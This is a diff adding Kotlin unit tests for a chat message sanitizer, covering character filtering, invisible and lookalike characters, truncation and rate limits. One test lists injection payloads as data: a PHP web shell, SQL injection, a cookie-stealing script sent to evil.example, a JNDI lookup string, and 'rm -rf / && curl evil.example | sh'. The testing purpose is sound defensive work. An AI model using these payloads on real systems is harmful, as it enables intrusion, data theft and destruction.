@@ -223,6 +223,73 @@ class CoreTest {
         assertNull(Pairing.Code.extract("no code here onyx1:short"))
     }
 
+    // ---------- message policy ----------
+
+    private val forbidden = "<>{}[]`$\\|;=#%&*_@/^~+"
+
+    private fun assertPolicy(out: String) {
+        assertTrue("too long: ${out.length}", out.codePointCount(0, out.length) <= MessagePolicy.MAX_CHARS)
+        out.forEach { c -> assertFalse("forbidden '$c' in \"$out\"", forbidden.indexOf(c) >= 0) }
+        assertFalse(out.contains('\n'))
+        // no two symbols adjacent (ignoring spaces)
+        val compact = out.replace(" ", "")
+        for (i in 1 until compact.length) {
+            val a = compact[i - 1]; val b = compact[i]
+            assertFalse("consecutive symbols in \"$out\"", !a.isLetterOrDigit() && !b.isLetterOrDigit() && !Character.isSurrogate(a) && !Character.isSurrogate(b))
+        }
+    }
+
+    @Test fun policyNeutralisesInjectionPayloads() {
+        val payloads = listOf(
+            "<?php system(\$_GET['c']); ?>",
+            "'; DROP TABLE users; --",
+            "<script>fetch('https://evil.example/?c='+document.cookie)</script>",
+            "\${jndi:ldap://evil.example/a}",
+            "rm -rf / && curl evil.example | sh",
+            "{{7*7}} \${7*7} <%= 7*7 %>",
+            "`whoami`; \$(id)",
+            "=HYPERLINK(\"http://x\",\"y\")",
+        )
+        for (p in payloads) {
+            val out = MessagePolicy.sanitize(p)
+            assertPolicy(out)
+        }
+        assertEquals("?php system(GET'c'", MessagePolicy.sanitize("<?php system(\$_GET['c']); ?>"))
+        assertEquals("' DROP TABLE users -", MessagePolicy.sanitize("'; DROP TABLE users; --"))
+        assertEquals("jndi:ldap:evil.examplea", MessagePolicy.sanitize("\${jndi:ldap://evil.example/a}"))
+    }
+
+    @Test fun policyKeepsNormalConversation() {
+        assertEquals("Hey! Are we still on for 7:30 tonight?", MessagePolicy.sanitize("Hey!! Are we still on for 7:30 tonight??"))
+        assertEquals("Guten Tag, ça va? Привет 你好", MessagePolicy.sanitize("Guten Tag, ça va? Привет 你好"))
+        assertEquals("ok 👍", MessagePolicy.sanitize("ok 👍👍👍"))
+        assertEquals("line one line two", MessagePolicy.sanitize("line one\nline two"))
+    }
+
+    @Test fun policyStripsInvisiblesAndLookalikes() {
+        assertEquals("admin", MessagePolicy.sanitize("ad\u200Bmin"))            // zero-width space
+        assertEquals("abc", MessagePolicy.sanitize("\u202Eabc\u202C"))            // bidi override removed
+        assertEquals("script", MessagePolicy.sanitize("\uFF1Cscript\uFF1E"))   // fullwidth < >
+        assertEquals("", MessagePolicy.sanitize("<<<>>>{}\u0000\u200D"))
+    }
+
+    @Test fun policyTruncatesTo80CodePoints() {
+        val out = MessagePolicy.sanitize("a".repeat(500))
+        assertEquals(80, out.length)
+        val emoji = MessagePolicy.sanitize("x😀".repeat(100))
+        assertTrue(emoji.codePointCount(0, emoji.length) <= 80)
+        assertFalse(Character.isHighSurrogate(emoji.last()))                  // never split a surrogate pair
+    }
+
+    @Test fun rateLimitStopsBulkSending() {
+        val now = 1_000_000L
+        assertTrue(MessagePolicy.rateAllowed(emptyList(), now))
+        assertFalse(MessagePolicy.rateAllowed(listOf(now - 100), now))        // faster than 0.7 s
+        assertTrue(MessagePolicy.rateAllowed(listOf(now - 1000), now))
+        assertFalse(MessagePolicy.rateAllowed(List(20) { now - 50_000 + it }, now))  // 20/min cap
+        assertTrue(MessagePolicy.rateAllowed(List(20) { now - 70_000 + it }, now))   // older than a minute
+    }
+
     // ---------- envelope ----------
 
     @Test fun envelopeRoundTripAndBucketed() {
